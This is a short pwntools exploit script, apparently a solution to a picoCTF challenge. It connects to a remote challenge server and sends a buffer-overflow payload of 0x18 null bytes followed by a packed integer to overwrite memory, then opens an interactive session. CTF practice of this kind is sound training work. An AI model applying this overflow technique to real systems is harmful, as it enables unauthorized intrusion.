#!/usr/bin/env python
from pwn import *
#r = process("local-target")
r = remote("saturn.picoctf.net", 64479)
#pause()
r.sendline(b"\x00"*0x18 + p32(65))

r.interactive()
r.close()
